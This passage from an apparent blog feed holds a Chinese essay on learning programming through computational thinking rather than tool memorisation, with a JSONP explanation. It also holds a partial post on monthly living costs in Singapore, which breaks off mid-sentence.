      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>當我們在學程式時，要學的到底是什麼？</title>
      <link href="/2018/10/30/learn-coding-9c572c2fb2/"/>
      <url>/2018/10/30/learn-coding-9c572c2fb2/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/learn-coding-9c572c2fb2/0__ue4x60JorXamJRJv.jpg"></p><p>小明原本是個從事行銷相關工作的新鮮人，在工作屆滿一年之時萌生了退意；沒專業知識又愛亂指揮人的主管、每天加班卻沒有加班費還是做不完事情的日子、絲毫不尊重專業也不尊重人的客戶，這一切的一切慢慢把他逼到極限。</p><p>有一天，當他在閱讀臉書的時候，看到了某個培訓班的廣告，標榜著只要來這邊上半年的課程，就可以輕鬆轉職成 Web 工程師，還附上一大堆參考資料以及強烈呼籲大家工程師的時代已經來臨，想上車要趁現在，這一班列車將帶你前往無限光明的未來。</p><p>小明仔細一想，覺得也挺合理的。畢竟日常生活看到一大堆 AI 征服世界、區塊鏈金融革命、AR&#x2F;VR 突破虛實界限的新聞，這些走在前沿的科技已經愈來愈純熟，感覺再不寫程式就要被時代的尖端給刺死，或是被潮流給吞噬了。</p><p>當晚，他就向主管提了離職，小明還很有責任的問說那是不是一個月後走差不多？這樣才能把現有的專案交接給其他同事。主管只是淡淡地說了：「你這種草莓族我看多了，不用待一個月，你明天就走吧」，小明雖想反駁，可也不想在這邊浪費時間，他倒是比較擔心要接專案的同事，什麼都沒有該怎麼接？但轉個念頭，自己當初進公司時也是這樣的，什麼都沒有，什麼都不在，什麼都不奇怪，與其擔心同事，不如勸同事趕快離職比較實在。</p><p>重獲自由以後，小明立刻報名了他昨天看到的培訓班，時機剛剛好，下個禮拜正好開課。繳了將近十萬塊的學費以後，小明滿心期待的盼望著課程，與此同時也自己先去網站了查了一些與程式相關的資料。</p><p>到了下週，課程正式開跑，為期半年的課程，上課時間簡直就像回到了高中生活，禮拜一到五、早上九點到晚上六點（還是比高中生幸福一點，不用七八點就到學校），要學的東西可不少，光是課綱就讓小明眼花撩亂，一大堆看不懂的英文簡寫，完全不知道是要幹嘛的。</p><p>接著讓我們來個電影式的快轉，後製麻煩幫我上個「半年後」的字樣在右下角，背景搭配台北市的縮時空景。</p><p>小明結業以後覺得自信滿滿，跟半年前的自己比起來了，現在可是會了一大堆技能，像是 Ruby on Rails（可填入任意一個後端相關技術）、HTML、CSS、JavaScript、jQuery、Node.js、React，怎麼想都覺得自己應該能輕鬆勝任工程師的工作。拜託，結業時的作品可是跟幾個同學完成了一個線上購物網站，該具備的技能可是都具備了。</p><p>除了培訓班有合作的幾間公司以外，他也自己上數字人力銀行網站投了履歷，但效果不是很好，他跟幾個同學交換求職的狀況，發現機會沒有想像中的多，還有同學說聽聞業界某些公司闡明了自己不收培訓班出來的學生。</p><p>小明心想是不是以前的學長姐雷了一波，導致公司把培訓班列入黑名單，否則自己會的技能那麼多，沒理由連面試的機會都不給吧。</p><p>雖說機會沒有想像中的多，但還是收到了大約十個面試邀請，不久後就迎來人生中的第一場工程師面試，地點在某辦公大樓，是一間做外包的接案公司，面試官看起來人滿好的，想必待會也會很順利吧。</p><p>「你先來個自我介紹吧，順便也介紹一下你履歷上的作品集」</p><p>『您好，我叫小明，從某某培訓班畢業，我附上的作品後端是用 RoR + MySQL，前端則是採用 React 來實作，有跟其他同學一起合作完成，是直接幫同學的親戚做了一個線上的購物網站』小明介紹完，心想：如何，還不錯吧！</p><p>「嗯，看起來還不錯，接著我們來問一些技術問題吧。你知道 Session 是什麼嗎？」</p><p>『知道，就是一個可以識別身份的機制，在 Rails 裡面可以用 session[:id] 來實作』</p><p>「那如果今天不讓你用這個，你還能做出一個 session 機制嗎？」</p><p>小明傻住了，想說這什麼鬼問題，不就是用框架內建的就好了嗎，更何況除了內建的以外，自己也不是完全理解 session 這東西，只知道怎麼用而已。</p><p>『呃…這個我可能就要去查一下資料，但我相信我有能力可以完成』</p><p>「好，再來，既然 Ruby 是個注重物件導向的程式語言，我們來談談它好了，可以請你說明一下類別跟物件的差異，以及什麼是繼承、什麼又是封裝嗎？」</p><p>小明心想：「這不簡單嗎，這個老師都有教過了，結業前的面試考前猜題也有這幾題，根本天助我也」，於是他就把之前早已回答過無數遍的答案給講了出來。</p><p>「這題答得不錯，接著我們來寫一點 code 吧？這一段程式碼你稍微研究一下，給你二十分鐘，我等等回來的時候希望看到你怎麼重構這段程式碼，用物件導向的幾個特點讓它更好維護」</p><p>小明看了看 code，發呆了二十分鐘不知所措。你要我回答什麼是物件導向這個簡單，可是你要我重構一段程式碼，這我還真的沒碰過，我連繼承都沒用過幾次，連 class 都沒寫過幾個，框架都有內建好的類別，自己根本不怎麼用這些功能的。</p><p>最後小明只改了幾個變數名稱，想說也只能這樣了。</p><p>面試官一回來，看了看程式碼之後稍微搖了搖頭，接著說：「最後我們來考一些簡單的程式題目好了，寫過九九乘法表嗎？」</p><p>小明點了點頭，回憶起之前自己特地練了這題，就因為聽說有同學不會寫這個而被刷掉，所以上了 leetcode 刷了幾題簡單的題目做足準備。</p><p>「那我們來個不一樣的，我想要一個 19*9 乘法表，然後輸出的順序要是 0, m, 1, m-1, 2, m-2…以此類推，舉例來說，當要輸出 7 的時候會長這樣：<br>7 * 1 &#x3D; 7<br>7 * 9 &#x3D; 63<br>7 * 2 &#x3D; 14<br>7 * 8 &#x3D; 56<br>7 * 3 &#x3D; 21<br>7 * 7 &#x3D; 49<br>7 * 4 &#x3D; 28<br>7 * 6 &#x3D; 42<br>7 * 5 &#x3D; 35」</p><p>小明心裡一驚，想說怎麼從來沒有看過這個題目，然後先把自己熟知的九九乘法表的程式碼寫出來，再開始東改西改，可是怎麼改都發現會有 bug，要嘛就是順序不對，要嘛就是跑到程式當掉。</p><p>小明奮戰二十分鐘之後，自知今天的面試之路應該就到這邊，之後也沒戲了，就對面試官說：「不好意思…這題我解不太出來」</p><p>面試官看了看小明東改西改的 code，説：「沒關係，那今天的面試差不多就到這邊，我跟幾個同事再討論一下，之後會請人資跟你聯絡」</p><p>第一次的面試就給了小明一記當頭棒喝，出現了一大堆以前沒有見過的問題，但也不是完全沒見過，他覺得自己面試失利的原因是題目還刷得不夠多，回家之後繼續上 leetcode 刷題，為下一次的面試做準備。</p><p>時間又過了一個月，小明陸陸續續接到面試邀請，每間公司的面試問題都不太一樣，只要是小明碰過的問題就答的很好，沒碰過的就七零八落。就在小明的努力不懈之下，在幾天後終於如意以償地拿到了某間公司的 offer，一個月 33k，做的是網頁開發，以後端為主軸，但前端也會碰到。</p><p>隨著在公司待的時間越長，小明漸漸變得迷惘，為什麼平常工作時候的那些技能以前都沒教？為什麼以前學了這麼多，可是工作上還是有一大堆問題解不開？為什麼工程師的工作跟他以前想像中的不一樣？</p><p>這一切的一切都還沒有人給他答案，而他雖然察覺不對勁，但也只能先這樣繼續的迷惘著，繼續的工作，繼續的寫 code。</p><p>落落長的開場白故事結束了，以上情節純屬虛構，如有雷同的話也很正常，因為我聽過的很多例子差不多就長這樣，但我沒有要針對某個特定培訓班的意思，無論是去外面上課還是自學，都可能擁有類似的經歷。</p><h3 id="你學的程式，到底哪裡出了問題？"><a href="#你學的程式，到底哪裡出了問題？" class="headerlink" title="你學的程式，到底哪裡出了問題？"></a>你學的程式，到底哪裡出了問題？</h3><p>如果你想讓一個人很快的就覺得自己會寫程式，那你應該怎麼做？</p><p>你就讓他去學而且<strong>只學</strong>一些現代的框架跟工具，他用著那些快速方便的指令、看著系統自動生成的幾個檔案，發現只要改一改就可以超快的做出自己想要的東西，他就會覺得自己會寫程式了。</p><p>或者是你叫他每天把這段程式碼打十遍，連續打個一個禮拜，讓他的手指記憶起來這些程式碼，過不久以後他就可以批哩啪啦在三分鐘內寫出一個部落格，哇，厲害！</p><p>看似厲害歸厲害，但如果我們把他用的這套工具給拿掉了，那還剩下什麼？</p><p>剩粉，bang！沒有啦開個小玩笑，正確答案是什麼都不剩。</p><p>他熟悉的不是程式，是那套框架、那套工具，只有在那個範疇裡面的東西才是他所熟悉的，一但換了一套工具或者是出現他沒碰過的狀況，就居居了。</p><p>這種工程師通常被稱為炮灰型工程師，或也可以叫做工具導向工程師吧。</p><p>那是什麼造成這樣的問題？問題在於，他只學到了表面而沒學到裡面，但重要的往往都是裡面而不是表面，光鮮亮麗的表面之下一定是複雜層疊的裡面所構造出來的。</p><p>舉個大家很熟悉的例子，請回憶起國高中時學習物理或數學時的情形，這大概是我們最早開始「刷題」的時候。</p><p>寫了作業、寫了點麵線的數學講義、寫了數學段考的歷屆考題，甚至有些人還會直接去拿數學競賽的題目來寫。可是儘管你再怎麼寫，段考時總是會出現一些你沒看過的題目，然後你就腦袋一片空白什麼都不會寫了。</p><p>但神奇的是，考完檢討考卷的時候，你發現這個解法你根本就會，你發現這一題也沒有想像中的困難，只不過是把以前學會的東西變換一下而已，解法一點也不深奧反而還很平易近人。</p><h3 id="你是在訓練記憶力還是解題能力？"><a href="#你是在訓練記憶力還是解題能力？" class="headerlink" title="你是在訓練記憶力還是解題能力？"></a>你是在訓練記憶力還是解題能力？</h3><p>有些人在用題海戰術刷題的時候，以為自己在鍛鍊解題能力，但殊不知其實在鍛鍊的是記憶力。他們在做題目的時候是這樣的：</p><ol><li>看看題目，如果看過就寫得出來</li><li>沒看過的話思考一下，想不出來看解答</li><li>看完解答做下一題</li></ol><p>題目看得多了，能回答正確的題目也就多了，因為已經知道解法是什麼了，自然能夠做得出來。</p><p>可是題目是無窮的，人的時間跟記憶力是有限的。</p><p>這種方法一但碰到了完全陌生的題目或是根據經典題目做一些改變的變化題，就完全沒轍，什麼都做不出來。</p><p>我不會說這種方法完全沒用，因為在某些特定場景下還真的滿好用的，特別是變化沒那麼多的時候，可能有八九成的題目都能被你命中。</p><p>但它不是一個可以被規模化的方法。它的成長是線性的，你看過 100 題你就會 100 題，你看過 n 題你就會 n 題，你要多學會 10 倍的題目，你就要花 10 倍的時間。</p><p>那可以被規模化的方法是什麼？是思考。</p><p>做題目的時候，重點是鍛鍊你的解題能力，好好想想應該怎麼把這道題目解出來。真的想不透了才看解答，可是看解答的時候也不是看過就算了，而是要邊看邊想說：「這個解答可能是怎麼想出來的？背後的原理是什麼？」，接著過一陣子重新寫一次同一道題目，確定自己還是能解出來，才能證明自己真的有把解法學起來，而不是用背的。</p><p>除此之外，也可以自己加一些變化題，這邊變一點那邊改一點，看看自己能否在其他條件下也能把題目解出來，與此同時也順便加強自己對這道題目的理解，如果你是真的有把解法吸收學習進去，那每一種變化應該都沒問題才對。</p><p>這樣做雖然在每一題會花更多時間，但效益卻是巨大的。</p><p>因為隨著解題能力慢慢被鍛鍊以後，會有一套潛移默化出來的解題方法，也會對題目越來越有「感覺」，就可以做出很多神奇的事，例如說：</p><ol><li>這題看起來就有種遞迴感，我猜是遞迴</li><li>這題很簡單啊，你就在這裡畫輔助線，你看，這樣你就會了吧</li><li>我們把這公式換一下然後兩邊同時加 x，欸你看，這不就是之前那題嗎</li></ol><p>我一直都認為刷題不是件壞事，這也是練習的一種。可是如果你的刷題只是為了衝高題目數量，以速度為優先一直寫題目而不管思考，就算刷了一百題，你所學到的解題能力可能跟十題差不多。</p><p>所以刷題的重點不在「刷」，看更多題目只是幫助你理解你是不是真的有把某個概念給搞懂，重點幫助自己檢驗以及補強解題方法，題目是手段，鍛鍊解題能力才是目的。可是卻有很多人把題目本身當成是目的。</p><p>就算真的靠這種題海戰術進了公司，我相信之後的職涯一定還是會碰到沒看過的題目，畢竟現實中的需求千變萬化，同一個需求在不同人口中可以有不同的樣貌，你再怎麼刷也不可能刷完。比起這些，好好鍛鍊自己解決問題的能力比較實在。</p><h3 id="學程式，但不只學寫程式"><a href="#學程式，但不只學寫程式" class="headerlink" title="學程式，但不只學寫程式"></a>學程式，但不只學寫程式</h3><p>如同開頭的例子所說的，有些人學程式還真的就只學「寫程式」，只要你會寫那些 code，會用那些作業系統或是框架提供的 API 就行了。</p><p>可是真正重要的不是這個，大家都看到小明在面試的時候被電得多慘了。</p><p><strong>真正重要的是你透過寫程式所學習到的那一套思考方法。</strong></p><p>這一點剛好我最近很有感，因為近期剛好帶了一群學生，儘管他們程式語法都懂，可是一些簡單的題目寫不出來。原因就是出在他們還沒熟悉那一套「程式的思考方法」。</p><p>通常數理邏輯好的人，學程式比較沒什麼大問題，因為背後的那一套思考體系是差不多的，我的課程開宗明義就講說希望帶給大家四種能力：</p><ol><li>具有找資料的能力，能夠知道如何找到相關資訊</li><li>具有分析問題的能力，能夠快速定位問題</li><li>知道如何解決問題，包括但不限於拆解問題、簡化問題、轉化問題</li><li>解決問題後能夠重新歸納並整理</li></ol><p>對我來說，用這些方式思考就像吃飯喝水那樣再正常不過，可是對很多沒有相關背景也毫無經驗的人，他們還是學不會「像電腦那樣一行一行思考」，他們寫出來的程式是一回事，心裡真的想要執行的流程又是另外一回事。可是程式是照你寫的跑，而不是照你想的跑。</p><p>而會不會寫程式的區別，我覺得就在於這些透過寫程式學習到的思考方法，你一但掌握了，今天就算教你一個新的程式語言你也能夠快速上手；反之，若是掌握不到，教你三個程式語言你還真的會當作三個全新的東西在學。</p><p>我上面所講的這個思考方法，其實就是大家在說的 <a href="https://computationalthinkingcourse.withgoogle.com/">Computational Thinking</a>，中文翻叫計算思維。</p><p>如同臺大資工系教授洪士灝在<a href="https://www.bnext.com.tw/article/39260/BN-2016-04-18-170158-178">資訊通識教育以及計算思維的教學法</a>一文中所提到的：</p><blockquote><p>我個人認為，計算思維中最重要的概念之一，是能夠將計算「抽象化」與「具體化」的能力，例如與影像相關的演算法那麼多，我不需要知道各種演算法長得什麼樣子，但我知道影像壓縮演算法可以幫我省下傳輸時間，影像辨認演算法可以幫我了解影像裡面有什麼物件（以上是抽象化），而這些演算法早已經有聰明的專家實作出來，我們可以透過網際網路，利用資料中心的雲端服務來使用這些演算法（這是具體化）。</p></blockquote><p>這種虛實轉換，一下抽象一下具體的能力是很需要的。其實我原本沒有意識到這件事情，是有學生跟我講之後我才想到的。</p><p>他跟我說，你不覺得寫程式很抽象嗎？在談的都是一些很抽象的東西，讓很不習慣這種思維方式的他覺得學習的很辛苦。</p><p>我仔細想想還真的滿抽象，例如說我們談到 IoC 控制反轉或是 DI 依賴注入的時候，它的目標就是在於把某一層抽出來而減少依賴，在程式的領域中這類型的方法用的可多了，對於工程師來說司空見慣，但對新手來說，根本看不懂你們在做什麼。</p><p>他們懂的使用迴圈、判斷式跟函式，可是卻不知道怎麼把它們組裝在一起，也不知道該怎麼把自己腦海中的解法（抽象）轉換成程式碼（實體）。或者是看了參考解答的程式碼，卻沒辦法轉換回去拼湊出原本的解法。</p><p>我記得有某陣子大家一直在討論國小國中的程式教育課程，我覺得這要看課綱的設計，如果能學習到 Computational Thinking，那我舉雙手贊成。要認清的一點是寫程式只是手段，目的是要讓他們能學習到背後的這個計算思維。如果只是停留在表面的「會寫程式碼就好」，那就沒什麼必要教了。</p><p>有了計算思維，就算不會寫程式也沒關係。因為這些思考方式不只有寫程式能用到，放到其他類似的領域也一定用得到。</p><h3 id="所以如果我想學程式，到底要學什麼才好？"><a href="#所以如果我想學程式，到底要學什麼才好？" class="headerlink" title="所以如果我想學程式，到底要學什麼才好？"></a>所以如果我想學程式，到底要學什麼才好？</h3><p>就照著你原本的計畫來學就好，但要記住兩個重點：</p><ol><li>計算思維</li><li>前因後果</li></ol><p>簡單來說就是一句話：<strong>要一直不斷的思考。</strong></p><p>舉例來說，當你學習到 CRUD 的時候，你要去想說為什麼是這四種？只有這四種就夠了嗎？他們搭配的 HTTP 方法分別是什麼？如果用別的動詞可以嗎？為什麼 HTTP 的方法有這麼多種？那些方法的用途是什麼？可以舉一些實際案例嗎？</p><p>或者是當你在學習一道新的題目，你可以先用紙筆列出解法的步驟，接著把每個一步驟都轉換為程式碼，一步一步慢慢試，用 debugger 一行一行執行，確保每一行的結果都跟你心裡想的一樣，或是也可以加 log 來驗證。</p><p>多想幾次，然後把題目做一些變化，試著讓自己嘗試一些不同的解法，自然就會對這種思考模式越來越熟練。</p><p>當你學到 session 的時候，也不能停留在會用的層次，你得知道它背後的原理大概是如何，可以自己利用資料庫或是 in-memory 的方式實作出一個簡單的 session 機制。一但你實作過了，當你被問到 cookie 與 session 的差異時這問題就簡單得多。</p><p>或是上完物件導向之後，不能只是停留在「知道」的層次，而是要動手下去做，自己隨便寫一個物件出來，然後隨意用用看。接著再把自己寫的程式碼重構，感受一下前後的差別在哪邊。</p><p>當你在學習一個新的概念的時候，先確保自己有基礎的理解，再來透過動手練習慢慢更加理解這項概念，最後試著自己實作出類似的東西，你會發現自己的理解程度又更上了一層樓。</p><p>而前因後果指的是當你在學習一項新的技術時，可以問自己以下五個問題：</p><ol><li>這個技術出現以前是什麼樣子？</li><li>那時候碰到什麼樣的問題？</li><li>這個技術的出現如何解決問題？</li><li>所以這項技術應該如何使用？</li><li>跟以前的解法比起來，差別在哪裡？有什麼優缺點？</li></ol><p>舉個例子好了，JSONP，有些人只會用它，可是卻不知道它為什麼會出現。</p><p>雖然現在大家都很熟悉 CORS 以及 Ajax 跨網域的問題，可是在很久以前，例如說還需要支援 IE7 的年代，它是不支援 CORS 的。那你想在 IE7 上面做跨網域的 Ajax 怎麼辦？你可以選擇用 Flash，或者是自己寫個 proxy server 做轉介，否則別無他法，但無論用哪一個解法都滿麻煩的。</p><p>直到 JSONP 的出現。</p><p>什麼是 JSONP？大家還記得 <code>&lt;script&gt;</code> 標籤嗎？這個標籤的 src 是不受網域限制的，你可以去載入其他 domain 的 script，例如說 Google Analytics 啦，或是一些 Public CDN 的資源。</p><p>既然這個標籤可以跨網域，假如載入的 script 內容可以幫我把資料帶回來，我不就達成了跨網域的 Ajax 嗎？因此我只要帶一個 callback 的參數到 server，server 輸出資料時去呼叫我帶的那個 function，不就 ok 了嗎？</p><p>舉例來說，我在頁面中安插一段 code 是：<br><code>&lt;script src=”https://example.com?callback=receiveData” /&gt;</code></p><p>然後 server 的 response 是：<code>receiveData([id: 1, name: ….])</code></p><p>這樣子我只要在我的程式碼裡面寫了個 receiveData 的 callback function，我就能夠非同步的去拿到 Server 帶過來的資料了！</p><p>這就是 JSONP，就是這麼簡單。有了 JSONP 之後，就能夠在 IE7 也順利地使用跨網域的 Ajax 了！不過因為是使用這種方式，所以只支援 GET 方法。</p><p>回過頭來看我前面提的那五個問題，上面的這段你可以找到全部的答案。當你學習 JSONP 的時候，不只要學他怎麼用，更重要的是學習你<strong>為什麼要用</strong>以及<strong>不用會怎麼樣</strong>。</p><p>如果你能夠回答出那五個問題，就能夠保證你對這項技術有一定的理解，而不是只會語法只會工具，不會被問到一點相關的問題就被問倒。</p><p>所以我才說你要一直不斷地去思考，不斷去想說我今天學的這個是為了什麼，當你的知識累積的越來越多，你就會發現一大堆東西都驚人的相似，學習一項新東西的時間也會變快。</p><p>例如說三大前端框架我只會 React（雖然他嚴格來講不算框架，但如果把整套生態系涵蓋進去，我覺得也可以稱作是框架了），但因為我知道它的核心概念，我知道它想解決的問題，所以假如我今天進了一間寫 Vue 或是寫 Angular 的公司，我也能夠保證在相對短的時間內可以快速上手（上手歸上手，要到熟練或是精通還是需要一定時間）。</p><p>因為原理都差不多，只是實作換了、語法換了、生態系的工具換了。但如果你只學到表面，你就會覺得怎麼又要學一整套新的框架，怎麼永遠都有學不完的東西。</p><h3 id="工具只是敲門磚，思維模式才能讓你走得長久"><a href="#工具只是敲門磚，思維模式才能讓你走得長久" class="headerlink" title="工具只是敲門磚，思維模式才能讓你走得長久"></a>工具只是敲門磚，思維模式才能讓你走得長久</h3><p>當然，對非本科系想轉職的初學者來說，工具還是必要的，你還是必須要會那些基本的技能，才能符合公司徵才的需求。</p><p>但要記住的是，更重要的東西是背後的那些思維模式，體現在你要怎麼解決一個問題，體現在你對一項技術到底只是會用，還是真的理解它在幹嘛，這些才是長期的發展中最重要的。</p><p>以我個人的例子來說，我一直以為自己職涯比較順遂是因為寫程式的能力，但我後來漸漸發現似乎不是這樣，如果你要論寫 code 的話，有一大堆人寫的 code 比我多比我好。</p><p>但是當今天真正要下去解決一個問題時，寫 code 反而是最後一件事情。在寫 code 以前，你必須要先去找到問題的癥結點，反覆確認這是造成問題的主因，再來是你要評估解法，有些解法可能不用寫 code，寫一些文件就可以解決了，當你把前面的事情都搞定以後，最後才是寫程式。</p><p>我會寫 code，但我不只會寫 code。</p><p>對我來說，怎麼樣去解決一個問題，怎麼試圖去看透問題的本質並且衡量各種解法的優缺點，那才是真正的核心競爭力。</p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>撇除娛樂不談，在新加坡生活一個月要多少錢？</title>
      <link href="/2018/10/14/singapore-expense-6f5caaf6dd75/"/>
      <url>/2018/10/14/singapore-expense-6f5caaf6dd75/</url>
      
        <content type="html"><![CDATA[<p>一直都沒有裝記帳 App 的我，從來就不清楚自己每個月到底花多少錢，看到自己存款的時候總會疑惑一下：「咦？為什麼存款比想像中少？不是說好一個月至少存一半的嗎？」，接著仔細回想自己前幾個月到底買了什麼，回台機票、昂貴耳機、亂買東西…怎麼算都還是覺得自己沒有花這麼多。</p><p>為了解決這個問題，終於下定決心裝了記帳 App，詳實地記錄自己的花費，一點一滴一撇一捺都攤在陽光底下，想藏匿也無所遁形。</p><p>所以這篇基本上就是來跟大家分享一下我在新加坡 2018 年 9 月份的花費。標題說了撇除娛樂不談，不是因為我特地去掉，而是因為我在新加坡本來就沒什麼娛樂，所以這篇記錄的花費非常簡單，就三種：交通、吃飯、房租（額外加水電與網路）。</p><h3 id="在新加坡生活一個月的花費"><a href="#在新加坡生活一個月的花費" class="headerlink" title="在新加坡生活一個月的花費"></a>在新加坡生活一個月的花費</h3><p>以下是我 9 月份的花費，簡單明瞭：</p><p><img src="/img/singapore-expense-6f5caaf6dd75/1__aw6icXOPZQ1__j4i5xStspA.png"></p><p>可以看到房租絕對是最大的一塊，直接佔了將近 70%，再來是吃飯佔了四分之一，剩下最少的 5% 才是水電網路與交通費。</p><p>整體下來一個月在新加坡的花費大約為 43k 台幣。</p><p>接著我要一項項來講細節了，細節是很重要的。因為同樣在新加坡生活，就算你只有計食宿交通，每個人還是會有不同的消費，所以接著要介紹一些脈絡，讓大家能有個比較清楚的概念，知道這樣的消費大概可以獲得什麼品質的回報。</p><h3 id="關於住宿與交通"><a href="#關於住宿與交通" class="headerlink" title="關於住宿與交通"></a>關於住宿與交通</h3><p>直接先從住宿開始講起，相信這應該是大家比較關心的問題。但在這之前要讓大家先對新加坡的地區有個概念，因為提到住宿但不提地區那就一點意義都沒有。</p><p>下圖是新加坡的地圖，藍色是我住宿的地方，紅框是一般金融業&#x2F;科技業比較多的區域，通常就稱為 downtown 市中心或是 CBD（Central Business Distric），是新加坡最熱鬧的地方。大家如果有看過濱海灣附近一堆辦公大樓的照片，就是在紅框中靠近右下角的那區。</p><p><img src="/img/singapore-expense-6f5caaf6dd75/1__smkSMoaoM1Oh__SIlZZ79vg.png"></p><p>下面是捷運地圖，藍色是我家附近的捷運站（DT11，Newton），紅色是我上班的地方（DT19，Chinatown ），而黃色框起來的那區塊則是前面我說的一大堆辦公室的 CBD。</p><p><img src="/img/singapore-expense-6f5caaf6dd75/1__raLKg34KaKn__3CLE5SLf__g.png"></p><p>從我家到辦公室一共 8 站，車資是 0.97 新幣，折合台幣約 22 塊，跟台北捷運的價格相去不遠（只看站數而不論實際距離的話），搭乘時間約為 18 分鐘左右。</p><p>從以上兩張地圖就可以大概知道我家的地理位置，離 CBD 有段距離但是捷運可到而且也不遠，附近捷運站有藍線紅線還算是方便。</p><p>介紹完了地理位置，接著來看這邊租屋的型態，可以簡單分成兩種：HDB（不是 Happy Birthday）跟 Condo。</p><p>前者是政府組屋，名字來自於新加坡的建屋發展局 Housing Development Board 的縮寫（剛開始我會一直搞混是 HDB 還是 HBD），以台灣來講就有點像是國宅，後者則像是社區大樓，有警衛有公設的那種。</p><p>接著在房屋內又分成兩種型態：一般房（common room）跟主人房（master room），後者就是主臥室，差別在於後者有內建浴室，而前者要跟其他房客共用。最常見的形式就是三房兩衛，一間衛浴在主人房裡面，另外一間衛浴給其他兩個房間的房客共用。</p><p>再來，租屋的價格跟地區當然也有一定的關係，以 HDB 一般房來說，我自己覺得價格應該普遍在 600~1000 左右，比較沒那麼靠近市中心就便宜些，生活機能越好就越貴。</p><p>以下這張圖是我剛來新加坡（2016 年 10 月）跟公司租的房間（公司租整間再租房間給員工），一個月是 1000 新幣（含網路跟兩週一次打掃，不含水電），就是 HDB 的 common room，地點在 Holland village。</p><p><img src="/img/singapore-expense-6f5caaf6dd75/1__3l0866__gVBfB9shm7hYAKQ.jpeg"></p><p>如果是 Condo 的話，價錢當然就貴了些，就算是 common room 也是 1000 起跳，而且根據 condo 等級也會不同，要我抓個範圍的話大概是 1000<del>1300 左右吧，master room 則是 1300</del>1700 左右。</p><p>其實房屋的價格就真的很看地區跟狀況，不能一概而論，但如果一定要給個範圍，我會給出上面那樣的範圍（但你也一定能找到在範圍外的選擇）。</p><p>接著就要來看我現在住的地方了，我現在住的是 condo 的主人房，基本上這一整區全部都是 condo，找不到 HDB，生活機能也比較差一點，我們社區比較小，只有游泳池跟小的健身房：</p><p><img src="/img/singapore-expense-6f5caaf6dd75/1__WIN2__CpxaYVKpkirVpqmeA.jpeg"><br><img src="/img/singapore-expense-6f5caaf6dd75/1__Rm4wPTLHCHtywSRfPS9A__g.jpeg"><br><img src="/img/singapore-expense-6f5caaf6dd75/1__riEyZsF09sXSbDGrYHhU2g.jpeg"></p><p>這樣的租金是一個月 1300 元（折合台幣約 3 萬元），其實是有便宜一些的（當初租這邊的時候便宜再加上跟室友分的時候又便宜些），不然 condo 主人房價格應該要再高點，我想大概 1500 起跳吧。</p><p>水電的話跟兩個室友分攤，分完之後一個月大概是 37 元新幣，折合台幣約 830 塊，網路的話是用 <a href="http://www.starhub.com/personal/for-your-home/home-broadband/fibre-broadband-plans.html">Starhub</a> 的 1Gbps Fibre Broadband，一個月 50 新幣，跟室友分完之後一個月大概是 380 塊台幣，網速跟品質我覺得還滿穩定的，就一年出個三四次差錯吧。</p><p>因為之前在台灣對水電費也沒概念，所以不知道這樣算是貴還便宜，因為家裡滿通風的關係所以冷氣很少開，照理來說應該電費部會太高才是。網路的話我在台灣家裡是用那種社區網路，一個月三四百塊但是品質不太穩定。</p><h3 id="吃飯到底貴不貴？"><a href="#吃飯到底貴不貴？" class="headerlink" title="吃飯到底貴不貴？"></a>吃飯到底貴不貴？</h3><p>住宿跟交通談完了，最後當然要來談談每天都要做的事：吃飯。</p><p>到底在新加坡吃飯貴不貴呢？如果你是觀光客，那當然貴，因為你去的都是一些四面八方觀光客雲集的地方，尤其是餐廳！餐廳那是真的貴一些。</p><p>所以吃飯也是很看地區的，就像你明明都在台北，你在信義區吃飯跟你在萬華吃飯就是不一樣的價格，跑到士林夜市又是另外一個價格。我在文章開頭已經有給大家一些基礎的觀念了，反正 CBD 吃飯就是特別貴，其他地方倒是還好。</p><p>下面這張是我每天早餐吃的米粉加蛋加青菜，在我公司附近的 food court，大家可以猜猜看多少錢：</p><p><img src="/img/singapore-expense-6f5caaf6dd75/1__ijm__fCBwzXhkSZAt8cTp1A.jpeg"></p><p>答案是：米粉 1 塊 + 青菜 0.5 塊 + 荷包蛋 0.6 塊 &#x3D; 2.1 塊新幣 &#x3D; 45 新台幣，這價錢應該比你想像中的低一點吧？至少在新加坡是很便宜的就是了，這邊麥當勞早餐少說都要個 90 台幣起跳還沒有薯餅，要吃到整套的都要破百了，2.1 塊真的是很經濟划算的選擇了。</p><p>午餐的部分我一餐大概是 5 塊新幣上下，折合台幣也就 110 左右而已，你如果是在台北市的一些地方工作，我想午餐也是差不多價錢吧，所以不要再聽信新加坡物價很高的傳聞了，要看地區！看地區！</p><p><img src="/img/singapore-expense-6f5caaf6dd75/1__5JyOGDCv8W9YHgtDxIr8Sg.jpeg"><br><img src="/img/singapore-expense-6f5caaf6dd75/1__ST1Bo79obP2spy09CGIgtw.jpeg"></p><p>上圖是我家附近的一個 food court，點一個炒飯或是雞肉套餐五塊錢而已，台幣 110 元，這樣的東西在台北大概 70、80 元左右？所以新加坡還是有貴，但真的沒有貴到兩倍這麼多。</p><p>不過誠如我上面所說，吃飯也是要看地區的，如果你在某些熱門辦公區吃飯，可能一餐要到 10 塊錢。不過以我現在待的跟之前待的（one north 那一區）來說，吃一餐大概是 5~8 塊錢左右。</p><p>至於假日的話我都懶得出門，所以都叫外送來吃，叫外送絕對是最花錢的選項之一，畢竟用金錢換時間嘛，在新加坡的外送主要有四間，我之前有特地寫一篇文章來介紹：<a href="/2017/10/21/delivery-services-2d90ec1e3555/">四款訂餐外送 App 不專業評測</a></p><p>不過這篇文章也有點過時了，現在 Uber eats 已經被 Grab Food 取代，deliveroo 也做了幾次改版，UI 變好看了，誠實蜜蜂的全館免運費也沒了。</p><p>外送之所以花錢，第一是外送費，公定價 3 塊新幣，第二是低消，公定價 12 塊新幣，因此吃一餐下來要 15 新幣！這簡直就是我平日一天的餐費，假日只要一餐就抵掉了，你就知道吃外送有多傷荷包。</p><p>有些時候會有些促銷，某些餐廳能夠免運費，但這樣也還是要 12 塊，折合台幣大概 270 塊錢！哇，早知道不要換算成台幣了，換算之後發現好貴…</p><p>總之呢，在新加坡一般吃飯不上館子的話，在 food court 可以吃到平價的食物，一餐大概 110 塊台幣左右就可以解決，在台北大概等於 70, 80 塊吃到的東西，而餐廳則是大概 1.5 